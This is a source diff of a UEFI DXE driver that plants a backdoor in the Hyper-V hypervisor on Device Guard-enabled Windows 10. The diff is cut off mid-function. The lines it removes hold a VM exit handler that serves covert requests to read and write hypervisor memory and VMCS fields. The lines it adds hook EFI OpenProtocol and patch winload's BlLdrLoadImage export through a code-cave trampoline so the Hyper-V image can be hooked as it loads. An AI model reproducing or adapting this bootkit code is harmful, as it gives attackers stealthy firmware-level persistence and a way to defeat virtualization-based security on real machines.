@@ -4,23 +4,6 @@
   UEFI DXE driver that injects Hyper-V VM exit handler backdoor into 
   the Device Guard enabled Windows 10 Enterprise.
   
-  Execution starts from new_ExitBootServices() -- a hook handler 
-  for EFI_BOOT_SERVICES.ExitBootServices() which being called by
-  winload!OslFwpKernelSetupPhase1(). After DXE phase exit winload.efi
-  transfers exeution to previously loaded Hyper-V kernel (hvix64.sys)
-  by calling winload!HvlpTransferToHypervisor().
-  
-  To transfer execution to Hyper-V winload.efi uses a special stub
-  winload!HvlpLowMemoryStub() copied to reserved memory page at constant
-  address 0x2000. During runtime phase this memory page is visible to
-  hypervisor core at the same virtual and physical address and has 
-  executable permissions which makes it a perfect place to store our 
-  Hyper-V backdoor code.
-  
-  VMExitHandler() is a hook handler for VM exit function of hypervisor 
-  core, it might be used for interaction between hypervisor backdoor and
-  guest virtual machines.
-  
   @d_olex
 
  *********************************************************************
@@ -33,9 +16,7 @@
 #include <Library/UefiDriverEntryPoint.h>
 #include <Library/UefiBootServicesTableLib.h>
 #include <Library/DebugLib.h>
-#include <Library/DevicePathLib.h>
 #include <Library/UefiRuntimeLib.h>
-#include <Library/SynchronizationLib.h>
 
 #include <IndustryStandard/PeImage.h>
 
@@ -52,6 +33,7 @@
 #include "ovmf.h"
 #include "std.h"
 #include "DmaBackdoorHv.h"
+#include "HyperV.h"
 #include "asm/common_asm.h"
 
 #pragma warning(disable: 4054)
@@ -60,14 +42,7 @@
 
 #pragma section(".conf", read, write)
 
-#define JUMP32_LEN 5
-
-// destination from operand
-#define JUMP32_ADDR(_addr_) ((UINTN)(_addr_) + *(INT32 *)((UINT8 *)(_addr_) + 1) + JUMP32_LEN)
-
-// destination to operand
-#define JUMP32_OP(_from_, _to_) ((UINT32)((UINTN)(_to_) - (UINTN)(_from_) - JUMP32_LEN))
-
+#define MAX_IMAGE_SIZE (1 * 1024 * 1024)
 
 EFI_STATUS 
 EFIAPI
@@ -95,20 +70,28 @@ __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig =
     0
 };
 
-PINFECTOR_STATUS m_InfectorStatus = (PINFECTOR_STATUS)(STATUS_ADDR);
-
 VOID *m_ImageBase = NULL;
+EFI_SYSTEM_TABLE *m_ST = NULL;
 EFI_BOOT_SERVICES *m_BS = NULL;
 
-// console I/O interface for debug messages
+// debug messages stuff
 EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
-//--------------------------------------------------------------------------------------
-void ConsolePrint(char *Message)
-{
-    UINTN Len = strlen(Message), i = 0;
+EFI_PHYSICAL_ADDRESS *m_PendingOutputAddr = (EFI_PHYSICAL_ADDRESS *)(DEBUG_OUTPUT_ADDR);
+char *m_PendingOutput = NULL;
 
+// winload hook stuff
+VOID *m_WinloadBase = NULL;
+UINT8 *m_TrampolineAddr = NULL;
+
+// Hyper-V stuff
+HYPER_V_INFO m_HvInfo;
+//--------------------------------------------------------------------------------------
+void ConsolePrintScreen(char *Message)
+{    
     if (m_TextOutput)
     {        
+        size_t Len = std_strlen(Message), i = 0;
+
         for (i = 0; i < Len; i += 1)
         {    
             CHAR16 Char[2];        
@@ -118,7 +101,111 @@ void ConsolePrint(char *Message)
 
             m_TextOutput->OutputString(m_TextOutput, Char);
         }
-    }   
+    }
+}
+
+void ConsolePrintBuffer(char *Message)
+{
+    size_t Len = std_strlen(Message);
+
+    if (m_PendingOutput && std_strlen(m_PendingOutput) + Len < DEBUG_OUTPUT_SIZE)
+    {                    
+        strcat(m_PendingOutput, Message);
+    }
+}
+
+void ConsolePrint(char *Message)
+{
+    // print messages to the screem
+    ConsolePrintScreen(Message);
+
+    // save messages to the buffer
+    ConsolePrintBuffer(Message);
+}
+//--------------------------------------------------------------------------------------
+void ConsoleInitialize(void)
+{
+    EFI_STATUS Status = EFI_SUCCESS;
+    EFI_PHYSICAL_ADDRESS PagesAddr;
+
+#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)
+
+    // initialize console I/O
+    Status = m_BS->HandleProtocol(
+        m_ST->ConsoleOutHandle, &gEfiSimpleTextOutProtocolGuid, 
+        (VOID **)&m_TextOutput
+    );
+    if (Status == EFI_SUCCESS)
+    {
+        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
+        m_TextOutput->ClearScreen(m_TextOutput);
+    }
+
+#endif
+
+    // allocate memory for debug output
+    Status = m_BS->AllocatePages(
+        AllocateAnyPages, EfiRuntimeServicesData, 
+        (DEBUG_OUTPUT_SIZE / PAGE_SIZE), &PagesAddr
+    );
+    if (Status == EFI_SUCCESS) 
+    {
+        EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;
+
+        *m_PendingOutputAddr = PagesAddr;
+
+        m_PendingOutput = (char *)PagesAddr;        
+        std_memset(m_PendingOutput, 0, DEBUG_OUTPUT_SIZE);
+
+        // save memory address into the firmware variable
+        Status = m_ST->RuntimeServices->SetVariable(
+            BACKDOOR_VAR_NAME, &VariableGuid,
+            EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_BOOTSERVICE_ACCESS,
+            sizeof(PagesAddr), (VOID *)&PagesAddr
+        );
+        if (EFI_ERROR(Status)) 
+        {
+            DbgMsg(__FILE__, __LINE__, "SetVariable() fails: 0x%X\r\n", Status);
+        }
+    }
+    else
+    {     
+        DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
+    }
+}
+//--------------------------------------------------------------------------------------
+VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
+{
+    EFI_STATUS Status = EFI_SUCCESS;
+
+    if (m_TextOutput == NULL)
+    {
+        // initialize console I/O
+        Status = m_BS->HandleProtocol(
+            m_ST->ConsoleOutHandle,
+            &gEfiSimpleTextOutProtocolGuid, 
+            (VOID **)&m_TextOutput
+        );
+        if (Status == EFI_SUCCESS)
+        {
+            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
+            m_TextOutput->ClearScreen(m_TextOutput);
+
+            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Text output protocol is ready\r\n");
+            
+            if (m_PendingOutput)
+            {                
+                // print pending messages
+                ConsolePrintScreen(m_PendingOutput);
+
+#if !defined(BACKDOOR_DEBUG_SCREEN)
+
+                m_TextOutput = NULL;
+#endif
+                m_BS->Stall(TO_MICROSECONDS(3));
+            }            
+        }        
+    }        
 }
 //--------------------------------------------------------------------------------------
 VOID *ImageBaseByAddress(VOID *Addr)
@@ -170,18 +257,13 @@ VOID *BackdoorImageRealocate(VOID *Image)
     );  
 
     // allocate memory for executable image
-    Status = m_BS->AllocatePages(
-        AllocateAnyPages,
-        EfiRuntimeServicesData,
-        PagesCount,
-        &Addr
-    );
+    Status = m_BS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, PagesCount, &Addr);
     if (Status == EFI_SUCCESS)
     {     
         VOID *Realocated = (VOID *)Addr;
 
         // copy image to the new location
-        m_BS->CopyMem(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 
+        std_memcpy(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 
 
         // update image relocations acording to the new address
         LDR_UPDATE_RELOCS(Realocated, Image, Realocated);
@@ -196,856 +278,304 @@ VOID *BackdoorImageRealocate(VOID *Image)
     return NULL;
 }
 //--------------------------------------------------------------------------------------
-// magic value of winload!HvlpBelow1MbPage to patch by PatchBelow1MbPageAddr()
-#define BELOW_1MB_PAGE_MAGIC 0x2db3d2288f108000
+#define MAX_MODULE_NAME_SIZE 0x100
 
-// offsets of VM exit handler code and data from the beginning of winload!HvlpBelow1MbPage
-#define VM_EXIT_HANDLER_INFO 0x800
-#define VM_EXIT_HANDLER_OLD  0xb00
-#define VM_EXIT_HANDLER_CODE 0xb40
-
-#define VM_F_EPT_COLLECT 0x01
-
-typedef struct _VM_EXIT_INFO
+typedef struct _LDR_DATA_TABLE_ENTRY
 {
-    UINT64 Flags;
-    UINT64 VmExitCounter;
-    EPT_INFO EptList[EPT_MAX_COUNT];
+   LIST_ENTRY InLoadOrderLinks;
+   LIST_ENTRY InMemoryOrderLinks;
+   LIST_ENTRY InInitializationOrderLinks;
+   VOID *DllBase;
+   VOID *EntryPoint;
+   UINTN SizeOfImage;
 
-} VM_EXIT_INFO,
-*PVM_EXIT_INFO;
+} LDR_DATA_TABLE_ENTRY;
 
-/*
-    Guest state saved by VM exit handler of hvix64.sys:
-
-        .text:FFFFF8000023A11E      mov     [rsp+arg_20], rcx
-        .text:FFFFF8000023A123      xor     ecx, ecx
-        .text:FFFFF8000023A125      mov     [rsp+arg_28], rcx
-        .text:FFFFF8000023A12A      mov     rcx, [rsp+arg_18]
-        .text:FFFFF8000023A12F      mov     [rcx], rax
-        .text:FFFFF8000023A132      mov     [rcx+8], rcx
-        .text:FFFFF8000023A136      mov     [rcx+10h], rdx
-        .text:FFFFF8000023A13A      mov     [rcx+18h], rbx
-        .text:FFFFF8000023A13E      mov     [rcx+28h], rbp
-        .text:FFFFF8000023A142      mov     [rcx+30h], rsi
-        .text:FFFFF8000023A146      mov     [rcx+38h], rdi
-        .text:FFFFF8000023A14A      mov     [rcx+40h], r8
-        .text:FFFFF8000023A14E      mov     [rcx+48h], r9
-        .text:FFFFF8000023A152      mov     [rcx+50h], r10
-        .text:FFFFF8000023A156      mov     [rcx+58h], r11
-        .text:FFFFF8000023A15A      mov     [rcx+60h], r12
-        .text:FFFFF8000023A15E      mov     [rcx+68h], r13
-        .text:FFFFF8000023A162      mov     [rcx+70h], r14
-        .text:FFFFF8000023A166      mov     [rcx+78h], r15
-*/
-typedef struct _VM_GUEST_STATE
-{
-    UINT64 Rax;
-    UINT64 Rcx;
-    UINT64 Rdx;
-    UINT64 Rbx;
-    UINT64 Rsp;
-    UINT64 Rbp;
-    UINT64 Rsi;
-    UINT64 Rdi;
-    UINT64 R8;
-    UINT64 R9;
-    UINT64 R10;
-    UINT64 R11;
-    UINT64 R12;
-    UINT64 R13;
-    UINT64 R14;
-    UINT64 R15;
-
-} VM_GUEST_STATE,
-*PVM_GUEST_STATE;
-
-typedef VOID (EFIAPI * func_VMExitHandler)(
-    VM_GUEST_STATE *Context, 
-    UINT64 a2, UINT64 a3, UINT64 a4
+typedef UINT64 (__stdcall * func_BlLdrLoadImage)(
+    VOID *arg_01, VOID *arg_02, VOID *arg_03, VOID *arg_04, VOID *arg_05, VOID *arg_06, VOID *arg_07, VOID *arg_08, 
+    VOID *arg_09, VOID *arg_10, VOID *arg_11, VOID *arg_12, VOID *arg_13, VOID *arg_14, VOID *arg_15, VOID *arg_16
 );
 
-VOID VMExitHandler(VM_GUEST_STATE *Context, UINT64 a2, UINT64 a3, UINT64 a4)
+func_BlLdrLoadImage old_BlLdrLoadImage = NULL;
+
+UINT64 __stdcall new_BlLdrLoadImage(
+    VOID *arg_01, VOID *arg_02, VOID *arg_03, VOID *arg_04, VOID *arg_05, VOID *arg_06, VOID *arg_07, VOID *arg_08, 
+    VOID *arg_09, VOID *arg_10, VOID *arg_11, VOID *arg_12, VOID *arg_13, VOID *arg_14, VOID *arg_15, VOID *arg_16)
 {
-    // this value will be patched by PatchBelow1MbPageAddr()
-    UINT8 *Below1MbPage = (UINT8 *)BELOW_1MB_PAGE_MAGIC;
+    UINT64 Status = old_BlLdrLoadImage(
+        arg_01, arg_02, arg_03, arg_04, arg_05, arg_06, arg_07, arg_08, 
+        arg_09, arg_10, arg_11, arg_12, arg_13, arg_14, arg_15, arg_16
+    );
 
-    VM_EXIT_INFO *Info = (VM_EXIT_INFO *)(Below1MbPage + VM_EXIT_HANDLER_INFO);
-    func_VMExitHandler old_VMExitHandler = (func_VMExitHandler)(Below1MbPage + VM_EXIT_HANDLER_OLD);
+    // just for sure
+    m_TextOutput = NULL;
 
-    // check for request from the client
-    if (Context->R10 == HVBD_VM_EXIT_MAGIC)
-    {        
-        EFI_STATUS Status = EFI_INVALID_PARAMETER;        
-
-        UINT64 Code = Context->R11;
-        UINT64 *Arg0 = &Context->R12;
-        UINT64 *Arg1 = &Context->R13;
-        UINT64 *Arg2 = &Context->R14;
-
-        if (Code == HVBD_C_INFO)
-        {
-            // return hypervisor CR0, CR3 and CR4 values
-            *Arg0 = __readcr0();
-            *Arg1 = __readcr3();
-            *Arg2 = __readcr4();
-
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_INFO_EX)
-        {
-            *Arg0 = *Arg1 = 0;            
-
-            // return hypervisor IDTR
-            __sidt(Arg0);
-
-            // return hypervisor GS segment base
-            *Arg2 = __readgsqword(0);            
-
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_INFO_EX2)
-        {
-            // return VM exit handler information            
-            *Arg1 = Info->VmExitCounter;
-            *Arg0 = (UINT64)Below1MbPage;
-
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_VIRT_READ)
-        {
-            // read virtual memory qword
-            *Arg1 = *(UINT64 *)*Arg0;
-
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_VIRT_WRITE)
-        {
-            // write virtual memory qword
-            *(UINT64 *)*Arg0 = *Arg1;
-
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_VMREAD)
-        {
-            // read VMCS value
-            __vmx_vmread(*Arg0, Arg1);
-
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_VMWRITE)
-        {
-            // write VMCS value
-            __vmx_vmwrite(*Arg0, *Arg1);
-
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_EPT_GET_START)
-        {
-            __stosb(&Info->EptList, 0xff, EPT_MAX_COUNT * sizeof(EPT_INFO));
-
-            Info->Flags |= VM_F_EPT_COLLECT;
-
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_EPT_GET_STOP)
-        {
-            *Arg0 = (UINT64)&Info->EptList;
-            *Arg1 = EPT_MAX_COUNT;
-
-            Info->Flags &= ~VM_F_EPT_COLLECT;
-                
-            Status = EFI_SUCCESS;
-        }
-        else if (Code == HVBD_C_INVL_CACHES)
-        {
-            // invalidate processor caches
-            __wbinvd();
-
-            // flush TLB
-            __writecr3(__readcr3());
-
-            Status = EFI_SUCCESS;
-        }
-
-        // report status code to the client
-        Context->R10 = Status;
-    }    
-
-    if (Info->Flags & VM_F_EPT_COLLECT)
+    if (Status == 0)
     {
-        UINTN i = 0;
-        UINT64 EptAddr = 0;
+        int Size = 0;    
+        char szModulePath[MAX_MODULE_NAME_SIZE];
 
-        // read EPT address from the current VMCS
-        __vmx_vmread(0x0000201A, &EptAddr);
+        // second argument contains module path
+        UINT16 *pPath = (UINT16 *)arg_02;    
 
-        for (i = 0; i < EPT_MAX_COUNT; i += 1)
+        while (*(pPath + Size) != 0)
         {
-            EPT_INFO *Entry = &Info->EptList[i];
+            // convert module path form UTF-16 to ACSII
+            szModulePath[Size] = *(char *)(pPath + Size);
+            Size += 1;
+        }
 
-            if (Entry->Addr == EPT_NONE)
+        szModulePath[Size] = '\0';
+
+        if (arg_08)
+        {
+            LDR_DATA_TABLE_ENTRY *LdrEntry = *(LDR_DATA_TABLE_ENTRY **)arg_08;
+
+            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): \"%s\"\r\n", szModulePath);
+
+            // check for the Hyper-V image
+            if (m_HvInfo.ImageBase == NULL && LdrGetProcAddress(LdrEntry->DllBase, "HvImageInfo") != NULL)
             {
-                Entry->Addr = EptAddr;
+                m_HvInfo.Status = BACKDOOR_ERR_HYPER_V_EXIT;
+                m_HvInfo.ImageBase = LdrEntry->DllBase;
+                m_HvInfo.ImageEntry = LdrEntry->EntryPoint;                                
 
-                // read VPID from the current VMCS
-                __vmx_vmread(0x00000000, &Entry->Vpid);
-
-                break;   
-            }
-            else if (Entry->Addr == EptAddr)
-            {
-                break;
+                // locate and hook VM exit handler
+                if ((m_HvInfo.VmExit = HyperVHook(LdrEntry->DllBase)) != NULL)
+                {
+                    m_HvInfo.Status = BACKDOOR_SUCCESS;
+                }
             }
         }
     }
 
-    Info->VmExitCounter += 1;
-
-    // call original function
-    old_VMExitHandler(Context, a2, a3, a4);
+    return Status;
 }
+//--------------------------------------------------------------------------------------
+// original address of hooked function
+EFI_OPEN_PROTOCOL old_OpenProtocol = NULL;
 
-VOID *VMExitHandler_end(VOID) { return (VOID *)&VMExitHandler; }
+// return address to ExitBootServices() caller
+UINT64 ret_OpenProtocol = 0;
 
-#define HV_SIGN_NOT_MATCHED  0
-#define HV_SIGN_MATCHED_1    1
-#define HV_SIGN_MATCHED_2    2
-
-VOID new_HvlpTransferToHypervisor(VOID *HvPageTable, VOID *HvEntry, VOID *HvlpLowMemoryStub)
+VOID *FindCallerImage(UINT64 Addr, char *TargetName)
 {
-    // this value will be patched by PatchBelow1MbPageAddr()
-    UINT8 *Below1MbPage = (UINT8 *)BELOW_1MB_PAGE_MAGIC;
+    VOID *Image = NULL;
+    UINT64 Size = 0;
 
-    HV_INFO *Info = (HV_INFO *)HV_INFO_ADDR;
-    UINT64 PageTable = __readcr3();
-    UINTN p = 0;
+    // align by page boundary
+    Addr &= ~(PAGE_SIZE - 1);
 
-    Info->WinloadPageTable = PageTable;
-    Info->HvPageTable = (UINT64)HvPageTable;
-    Info->HvEntry = (UINT64)HvEntry;     
-
-    while (p < 0x10000)
+    // determinate winload.dll base address
+    for (Size = 0; Size < MAX_IMAGE_SIZE && Addr > 0; Size += 1)
     {
-        UINT8 *Func = (UINT8 *)HvEntry + p, Matched = HV_SIGN_NOT_MATCHED;   
-
-        __writecr3(HvPageTable);
-
-        /*
-            Match hvix64.sys VM exit handler code signature:
-
-                .text:FFFFF8000023A11E      mov     [rsp+arg_20], rcx
-                .text:FFFFF8000023A123      xor     ecx, ecx
-                .text:FFFFF8000023A125      mov     [rsp+arg_28], rcx
-                .text:FFFFF8000023A12A      mov     rcx, [rsp+arg_18]
-                .text:FFFFF8000023A12F      mov     [rcx], rax
-                .text:FFFFF8000023A132      mov     [rcx+8], rcx
-
-                ...
-
-                .text:FFFFF8000023A166      mov     [rcx+78h], r15
-
-                ...
-
-                .text:FFFFF8000023A19F      mov     rdx, [rsp+arg_28]
-                .text:FFFFF8000023A1A4      call    _vmentry_handle
-        */
-        if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
-            *(Func + 0x11) == 0x48 && *(Func + 0x12) == 0x89 && *(Func + 0x13) == 0x01 && 
-            *(Func + 0x14) == 0x48 && *(Func + 0x15) == 0x89 && *(Func + 0x16) == 0x49 && *(Func + 0x17) == 0x08 &&
-            *(Func + 0x48) == 0x4c && *(Func + 0x49) == 0x89 && *(Func + 0x4a) == 0x79 && *(Func + 0x4b) == 0x78 &&
-            *(Func + 0x86) == 0xe8)
+        if (*(UINT16 *)Addr == EFI_IMAGE_DOS_SIGNATURE)
         {
-            Matched = HV_SIGN_MATCHED_1;
-        }
-        else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
-                 *(Func + 0x11) == 0x48 && *(Func + 0x12) == 0x89 && *(Func + 0x13) == 0x01 && 
-                 *(Func + 0x14) == 0x48 && *(Func + 0x15) == 0x89 && *(Func + 0x16) == 0x49 && *(Func + 0x17) == 0x08 &&
-                 *(Func + 0x48) == 0x4c && *(Func + 0x49) == 0x89 && *(Func + 0x4a) == 0x79 && *(Func + 0x4b) == 0x78 &&
-                 *(Func + 0xd7) == 0xe8)
-        {
-            Matched = HV_SIGN_MATCHED_2;   
-        }
-
-        __writecr3(PageTable);
-
-        if (Matched != HV_SIGN_NOT_MATCHED)
-        {
-            UINT8 *Buff = Below1MbPage + VM_EXIT_HANDLER_OLD;   
-            UINT32 HookSize = 0;    
-
-            __writecr3(HvPageTable);
-
-            if (Matched == HV_SIGN_MATCHED_1)
-            {
-                // 1-st signature was matched
-                Func = (UINT8 *)JUMP32_ADDR(Func + 0x86);
-                HookSize = 13;
-            }
-            else if (Matched == HV_SIGN_MATCHED_2)
-            {
-                // 2-nd signature was matched
-                Func = (UINT8 *)JUMP32_ADDR(Func + 0xd7);
-                HookSize = 16;
-            }
-
-            __writecr3(PageTable);
-
-            Info->HvVmExit = (UINT64)Func;
-
-            __writecr3(HvPageTable);
-
-            // save original bytes of VM exit handler
-            __movsb(Buff, Func, HookSize);
-
-            __writecr3(PageTable);
-
-            // mov rax, addr
-            *(UINT16 *)(Buff + HookSize) = 0xb848;
-            *(UINT64 *)(Buff + HookSize + 2) = (UINT64)(Func + HookSize);
-
-            // jmp rax ; from callgate to function
-            *(UINT16 *)(Buff + HookSize + 10) = 0xe0ff;
-
-            __writecr3(HvPageTable);
-
-            // mov rax, addr
-            *(UINT16 *)Func = 0xb848;
-            *(UINT64 *)(Func + 2) = (UINT64)(Below1MbPage + VM_EXIT_HANDLER_CODE);
-
-            // jmp rax ; from function to callgate
-            *(UINT16 *)(Func + 10) = 0xe0ff;
-
-            __writecr3(PageTable);
-
+            Image = (VOID *)Addr;
             break;
         }
 
-        p += 1;
+        Addr -= PAGE_SIZE;
+    }   
+
+    if (Image)
+    {
+        EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
+            Image, ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);
+
+        // get image exports
+        UINT32 ExportAddr = pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+
+        if (ExportAddr != 0)
+        {                    
+            EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);                    
+
+            // check image name
+            if (std_strcmp((char *)RVATOVA(Image, Export->Name), TargetName) == 0)
+            {
+                return Image;
+            }
+        }
     }
 
-    Info->Success += 1;
+    return NULL;
 }
 
-VOID *new_HvlpTransferToHypervisor_end(VOID) { return (VOID *)&new_HvlpTransferToHypervisor; } 
-//--------------------------------------------------------------------------------------
-VOID *FindLoadedImageInRange(char *ImageName, VOID *Addr, UINTN Len)
+EFI_STATUS EFIAPI new_OpenProtocol(
+    EFI_HANDLE Handle, 
+    EFI_GUID *Protocol, 
+    VOID **Interface, 
+    EFI_HANDLE AgentHandle, 
+    EFI_HANDLE ControllerHandle, 
+    UINT32 Attributes)
 {
-    UINTN p = 0;
+    if (m_WinloadBase == NULL)
+    {        
+        // chcek if OpenProtocol() was called from the winload image
+        if ((m_WinloadBase = FindCallerImage(ret_OpenProtocol, "BootLib.dll")) != NULL)
+        {
+            DbgMsg(__FILE__, __LINE__, "winload.dll is at "FPTR"\r\n", m_WinloadBase);
 
-    while (p < Len - PAGE_SIZE)
-    {
-        UINT8 *Image = (UINT8 *)Addr + p;
-        EFI_IMAGE_DOS_HEADER *DosHeader = (EFI_IMAGE_DOS_HEADER *)Image;
+            m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_FUNC;
 
-        // check for PE image header signature
-        if (*(UINT16 *)Image == EFI_IMAGE_DOS_SIGNATURE && DosHeader->e_lfanew >= sizeof(EFI_IMAGE_DOS_HEADER))
-        {     
-            EFI_IMAGE_NT_HEADERS *Header = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Image, DosHeader->e_lfanew);
-
-            // check for legit header
-            if (Header->Signature == EFI_IMAGE_NT_SIGNATURE)
+            // get winload!BlLdrLoadImage() export address
+            if ((old_BlLdrLoadImage = (func_BlLdrLoadImage)LdrGetProcAddress(m_WinloadBase, "BlLdrLoadImage")) != NULL)
             {
-                char *ExportName = NULL;
-                UINT32 ExportAddr = Header->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+                DbgMsg(__FILE__, __LINE__, "winload!BlLdrLoadImage() is at "FPTR"\r\n", old_BlLdrLoadImage);   
 
-                #define VALID_RVA(_v_) ((_v_) > PAGE_SIZE && (_v_) < Header->OptionalHeader.SizeOfImage)
+                m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_HOOK;
+            }
+            else
+            {
+                DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!BlLdrLoadImage()\r\n");
+            }
 
-                if (VALID_RVA(ExportAddr))
-                {                    
-                    EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);                    
+            // remove EFI_BOOT_SERVICES.OpenProtocol() hook
+            m_BS->OpenProtocol = old_OpenProtocol;  
+        }
 
-                    // sanity check
-                    if (Export->Characteristics == 0 && Export->MajorVersion == 0 && Export->MinorVersion == 0 &&
-                        (Export->AddressOfNames == 0 || VALID_RVA(Export->AddressOfNames)) &&
-                        (Export->AddressOfFunctions == 0 || VALID_RVA(Export->AddressOfFunctions)) && 
-                        (Export->AddressOfNameOrdinals == 0 || VALID_RVA(Export->AddressOfNameOrdinals)))
+        if (old_BlLdrLoadImage)
+        {
+            UINT32 Trampoline = 0, i = 0;            
+
+            EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
+                m_WinloadBase, ((EFI_IMAGE_DOS_HEADER *)m_WinloadBase)->e_lfanew);
+
+            EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
+                &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);
+
+            // find code section by name
+            for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1, pSection += 1)
+            {
+                if (std_strcmp((char *)&pSection->Name, ".text") == 0)
+                {
+                    UINT32 MaxSize = ALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);
+                    
+                    DbgMsg(
+                        __FILE__, __LINE__, "%d free bytes found at the end of the code section at "FPTR"\r\n",
+                        MaxSize - pSection->Misc.VirtualSize,
+                        RVATOVA(m_WinloadBase, pSection->VirtualAddress + pSection->Misc.VirtualSize)
+                    );
+
+                    // check for the free space at the end of the section
+                    if (MaxSize - pSection->Misc.VirtualSize > JUMP64_LEN + JUMP32_LEN)
                     {
-                        // get export name for this image
-                        if (VALID_RVA(Export->Name))
+                        Trampoline = pSection->VirtualAddress + pSection->Misc.VirtualSize;
+                    }
+                    
+                    break;
+                }
+            }       
+
+            if (Trampoline != 0)
+            {
+                EFI_IMAGE_EXPORT_DIRECTORY *pExport = NULL;
+                
+                // get address of winload!BlLdrLoadImage() hook trampoline
+                m_TrampolineAddr = RVATOVA(m_WinloadBase, Trampoline);
+
+                // mov rax, new_BlLdrLoadImage
+                *(UINT16 *)m_TrampolineAddr = 0xb848;
+                *(UINT64 *)(m_TrampolineAddr + 2) = (UINT64)&new_BlLdrLoadImage;
+
+                // jmp rax
+                *(UINT16 *)(m_TrampolineAddr + 10) = 0xe0ff;                
+
+                if (pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
+                {
+                    // get export directory address
+                    pExport = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(
+                        m_WinloadBase,
+                        pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+                    );
+                }
+
+                if (pExport)
+                {
+                    UINT32 *AddressOfFunctions = (UINT32 *)RVATOVA(m_WinloadBase, pExport->AddressOfFunctions);
+                    INT16 *AddrOfOrdinals = (INT16 *)RVATOVA(m_WinloadBase, pExport->AddressOfNameOrdinals);
+                    UINT32 *AddressOfNames = (UINT32 *)RVATOVA(m_WinloadBase, pExport->AddressOfNames);
+
+                    // locate needed export
+                    for (i = 0; i < pExport->NumberOfFunctions; i += 1)
+                    {
+                        if (std_strcmp((char *)RVATOVA(m_WinloadBase, AddressOfNames[i]), "BlLdrLoadImage") == 0)
                         {
-                            ExportName = (char *)RVATOVA(Image, Export->Name);
+                            DbgMsg(
+                                __FILE__, __LINE__, 
+                                "winload!BlLdrLoadImage() hook was set, handler is at "FPTR"\r\n",
+                                new_BlLdrLoadImage
+                            );
+
+                            m_HvInfo.Status = BACKDOOR_ERR_HYPER_V_IMAGE;
+
+                            // patch function RVA
+                            AddressOfFunctions[AddrOfOrdinals[i]] = Trampoline;
+                            break;
                         }
                     }
                 }
-
-                if (ExportName && std_strcmp(ExportName, ImageName) == 0)
-                {
-                    return Image;
-                }
-            }            
-        }
-
-        p += PAGE_SIZE;
-    }
-
-    return NULL;
-}
-
-VOID *FindLoadedImage(char *ImageName)
-{
-    EFI_STATUS Status = EFI_SUCCESS;
-    EFI_MEMORY_DESCRIPTOR *MapList = NULL;
-    UINTN MapSize = 0, MapKey = 0, DescriptorSize = 0;
-    UINT32 DescriptorVersion = 0;
-
-    // get memory map size
-    Status = m_BS->GetMemoryMap(&MapSize, NULL, &MapKey, &DescriptorSize, &DescriptorVersion);
-    if (Status != EFI_BUFFER_TOO_SMALL)
-    {
-        DbgMsg(__FILE__, __LINE__, "GetMemoryMap() ERROR 0x%x\r\n", Status);
-        return NULL;
-    }
-
-    DbgMsg(__FILE__, __LINE__, "EFI_MEMORY_DESCRIPTOR version is 0x%x\r\n", DescriptorVersion);    
-
-    // allocate memory map buffer
-    Status = m_BS->AllocatePool(EfiBootServicesData, MapSize, (VOID **)&MapList);
-    if (Status != EFI_SUCCESS)
-    {
-        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
-        return NULL;
-    }
-
-    // get memory map
